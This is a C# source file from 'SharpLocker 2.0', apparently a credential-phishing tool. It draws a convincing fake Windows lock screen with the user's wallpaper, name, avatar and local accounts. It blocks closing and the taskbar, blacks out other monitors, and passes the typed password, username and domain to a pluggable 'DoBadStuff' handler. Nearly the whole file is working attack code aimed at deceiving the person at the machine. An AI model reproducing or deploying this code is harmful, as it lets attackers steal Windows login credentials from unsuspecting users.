using SharpLocker_2._0.Classes;
using System;
using System.Collections.Generic;
using System.Data;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SharpLocker_2._0
{
    public partial class WindowsLogin : Form
    {
        #region "Variables and Stuff"

        private bool DenyClose { get; set; }
        private Interfaces.IDoBadStuff DoBadStuff;

        private const string PLACEHOLDER_TEXT = "Password";

        #endregion

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            #if !DEBUG
                e.Cancel = DenyClose;
            #endif
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        #endregion

        private void LoginButton_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;

            DenyClose = false;
            #if !DEBUG
                KeyPressHandler.Enable();
            #endif
            DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);

            Close();
        }

#region "Password"

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            CapsLockLabel.Visible = Control.IsKeyLocked(Keys.CapsLock);
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();

            if (PasswordTextBox.Text == PLACEHOLDER_TEXT)
            {
                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                {
                    PasswordTextBox.Select(0, 0);
                    e.Handled = true;
                }
            }
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;

            if (string.IsNullOrEmpty(tb.Text))
            {
                SetPlaceholder();
            }

            if (tb.Text.Substring(1, tb.Text.Length - 1) == PLACEHOLDER_TEXT)
            {
                tb.UseSystemPasswordChar = true;
                tb.Font = new Font("Microsoft Sans Serif", 23.25f);
                tb.Text = tb.Text.Substring(tb.Text.Length - 1);
                tb.ForeColor = SystemColors.WindowFrame;
                tb.Select(1, 0);
            }
        }

        private void PasswordTextBox_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) PasswordTextBox.Select(0, 0);
        }

        private void SetPlaceholder()
        {
            PasswordTextBox.UseSystemPasswordChar = false;
            PasswordTextBox.Text = PLACEHOLDER_TEXT;
            PasswordTextBox.Font = new Font("Microsoft Tai Le", 21.00f);
            PasswordTextBox.ForeColor = SystemColors.ControlLight;
            PasswordTextBox.Select(0, 0);
        }

#endregion

#region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            BlurBackground();
            PasswordTextBox.Focus();
        }

        private void Initialize()
        {
            InitializeMisc();
            InitializePasswordTextbox();
            InitializeTaskbar();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
            InitializeOtherUsers();
        }

        private void InitializeMisc()
        {
            DenyClose = true;
            CapsLockLabel.Visible = false;
            #if DEBUG
                TopMost = false;
            #else
                TopMost = true;
            #endif

        }

        private void InitializePasswordTextbox()
        {
            SetPlaceholder();
        }

        private void InitializeBadStuff()
        {
            DoBadStuff = new Interfaces.BadStuffLoader().Get();

            if (DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
        }

        private void InitializeTaskbar()
        {
            #if !DEBUG
                KeyPressHandler.Disable();
            #endif
        }

        private void InitializeUserLabel()
        {
            try
            {
                UserNameLabel.Text = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
            }
            catch
            {
                UserNameLabel.Text = Environment.UserName;
            }
        }

        private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));

        private void InitializeBackground() => BackgroundImage = GetBackgroundImage();

        private void BlurBackground()
        {
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(2);
        }

        private void InitializeUserIcon()
        {
            SetUserIconByName(Environment.UserName, UserIconPictureBox);
        }

        private Image GetUserIconFromPath(string fileEnding, string path)
        {
            try
            {
                foreach (string f in Directory.GetFiles(path))
                {
                    if (!f.EndsWith($".{fileEnding}")) continue;
                    if (!Path.GetFileName(f).Contains(Environment.UserName)) continue;
                    return Image.FromFile(f);
                }

                return null;
            }
            catch
            {
                return Properties.Resources.defaultAvatar;
            }
        }

        private void SetUserIconByName(string username, PictureBox pb)
        {
            Image img = null;

            string[] pathArr = Path.GetTempPath().Split('\\');
            string[] userDomainFromPath = pathArr[2].Split('.');

            try
            {
                switch (userDomainFromPath.Length)
                {
                    case 1:
                        pathArr[2] = username;
                        break;

                    case 2:
                        userDomainFromPath[0] = username;
                        pathArr[2] = string.Join(".", userDomainFromPath);
                        break;
                }
            }
            catch { }

            string path = string.Join("\\", pathArr);

            if (string.IsNullOrEmpty(username))
                img = Properties.Resources.defaultAvatar;

            if (img is null)
                img = GetUserIconFromPath("bmp", path);

            if (img is null)
                img = GetUserIconFromPath("png", path);

            if (img is null)
                img = GetUserIconFromPath("jpg", path);

            if (img is null)
                img = Properties.Resources.defaultAvatar;

            pb.Image = ResizeImage(img, pb.Width, pb.Height);

            GraphicsPath gp = new GraphicsPath();
            gp.AddEllipse(0, 0, pb.Width - 1, pb.Height - 1);
            Region rg = new Region(gp);
            pb.Region = rg;
        }

        public Bitmap ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;

                using (var wrapMode = new ImageAttributes())
                {
                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }

            return destImage;
        }

        private void InitializeOtherScreens()
        {
            #if !DEBUG
                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
                {
                    new Task(() => BlackScreen(screen)).Start();
                }
            #endif
        }

        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black,
                TopMost = true
            };

            blackForm.FormClosing += WindowsLogin_FormClosing;

            blackForm.ShowDialog();
        }

        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 1;
            e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                PasswordTextBox.Location.X - offset,
                PasswordTextBox.Location.Y - offset,
                PasswordTextBox.Width + offset,
                PasswordTextBox.Height + offset));
        }

        private void InitializeOtherUsers()
        {
            const int UF_ACCOUNTDISABLE = 0x0002;
            int buttonCounter = 0;

            AddChangeUserButton(null, buttonCounter);
            buttonCounter++;

            DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
            foreach (DirectoryEntry user in localMachine.Children)
            {
                if (user.SchemaClassName != "User") continue;
                if (((int)user.Properties["UserFlags"].Value & UF_ACCOUNTDISABLE) == UF_ACCOUNTDISABLE) continue;
                if (user.Name == "Admin") continue;

                AddChangeUserButton(user, buttonCounter);
                buttonCounter++;
            }

        }

        private void AddChangeUserButton(DirectoryEntry user, int buttonCount)
        {
            int buttonX = 12;
            int buttonY = 388;
            int buttonWidth = 200;
            int buttonHeight = 50;
            int pictureBoxXOffset = 10;
            int pictureBoxYOffset = 2;

            Button b = new Button()
            {
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                Location = new Point(buttonX, buttonY + buttonHeight * buttonCount * -1),
                Size = new Size(buttonWidth, buttonHeight),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.Transparent,
                Font = new Font("Microsoft Sans Seri", 12),
                ForeColor = Color.White,
                BackgroundImageLayout = ImageLayout.Stretch
            };

            b.FlatAppearance.BorderSize = 0;
            b.FlatAppearance.MouseOverBackColor = Color.LightGray;
            b.Paint += (s, e) =>
            {
                e.Graphics.DrawString(FindDisplayName(user), b.Font, Brushes.White, buttonHeight + pictureBoxXOffset * 2, buttonHeight * 0.25f);
            };

            if (!(user is null) && user.Name == Environment.UserName) b.BackgroundImage = Properties.Resources.defaultButtonBackground;

            PictureBox pb = new PictureBox()
            {
                BackColor = Color.Transparent,
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                BackgroundImageLayout = ImageLayout.Stretch,
                Location = new Point(buttonX + pictureBoxXOffset, (buttonY + pictureBoxYOffset / 2) + buttonHeight * buttonCount * -1),
                Size = new Size(buttonHeight - pictureBoxYOffset, buttonHeight - pictureBoxYOffset)
            };

            SetUserIconByName(user is null ? "" : user.Name, pb);

            Controls.Add(pb);
            Controls.Add(b);
        }

        private string FindDisplayName(DirectoryEntry user)
        {
            string displayName = "";

            if (user is null)
                return "Other User";

            try
            {
                if (string.IsNullOrEmpty(displayName))
                    displayName = UserPrincipal.FindByIdentity(UserPrincipal.Current.Context, user.Name).DisplayName;
            }
            catch { }

            if (string.IsNullOrEmpty(displayName))
                return user.Name;

            return displayName;
        }

    }

#endregion

}
